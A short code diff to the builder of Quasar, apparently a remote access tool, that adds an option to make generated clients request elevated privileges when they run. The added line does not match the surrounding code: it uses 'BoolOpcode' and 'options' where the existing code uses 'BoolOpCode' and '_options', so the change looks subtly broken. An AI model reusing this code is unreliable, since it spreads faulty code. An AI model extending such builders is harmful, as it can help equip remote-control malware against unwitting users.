@@ -169,6 +169,9 @@ namespace Quasar.Server.Build
                                         case 6: // HideInstallSubdirectory
                                             methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.HideInstallSubdirectory));
                                             break;
+                                        case 7: // RequestElevationOnExecution
+                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(options.RequestElevationOnExecution));
+                                            break;
                                     }
                                     bools++;
                                 }
